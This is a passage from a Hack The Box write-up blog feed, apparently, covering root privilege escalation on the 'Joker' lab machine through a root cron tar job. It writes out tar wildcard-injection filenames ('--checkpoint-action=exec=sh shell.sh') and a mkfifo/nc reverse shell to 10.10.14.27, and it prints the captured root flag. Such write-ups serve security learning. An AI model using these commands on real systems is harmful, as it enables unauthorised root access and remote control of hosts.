&lt;p&gt;The options we are going to use are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--checkpoint-action&lt;/code&gt;. With tar you can specify checkpoints and a checkpoint action which will run commands at each checkpoint. So all we have to do is set a checkpoint action to run another python UDP shell.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~$ mv development/ development.bak
alekos@joker:~$ ln -s /root/ development
alekos@joker:~$ cd development.bak/
alekos@joker:~/development.bak$ touch -- --checkpoint=1
alekos@joker:~/development.bak$ touch -- '--checkpoint-action=exec=sh shell.sh'
alekos@joker:~/development.bak$ nano shell.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development.bak$ sed 's/tmp\/f/tmp\/i/g' shell.sh
#!/bin/bash
rm /tmp/i
mkfifo /tmp/i
cat /tmp/i|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &amp;gt;/tmp/i
alekos@joker:~/development.bak$ sed 's/tmp\/f/tmp\/i/g' shell.sh -i
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development.bak$ cd ..
alekos@joker:~$ rm development
alekos@joker:~$ mv development.bak/ development
alekos@joker:~$ cd development/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alekos@joker:~/development$ date
Sun Apr 26 19:41:37 EEST 2020
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; nc -u -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.21] 57510
/bin/sh: 0: can't access tty; job control turned off
# python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
root@joker:/home/alekos/development# id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat /root/root.txt
id &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
root
d452b7faf5fd5b30210f340ef1d4146e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hack-only-for-fun-and-learning-not-for-profit&quot;&gt;Hack only for fun and learning. Not for profit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/joker14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Joker" /><category term="Squid-Proxy" /><category term="Sudo Abuse" /><category term="SymLink" /><summary type="html">Joker was a hard box with a Http-Proxy-Squid that allows us through the TFTP to retrieve the username and password. The credentials we retrieve can be used to access the site where, bruteforcing the directories we will find a Python Console. After taking a shell, we will use sudo to create a symlink with our ssh key, to access with the user Alekos. For the privesc we will abuse a crontab which saves archivies as root.</summary></entry></feed>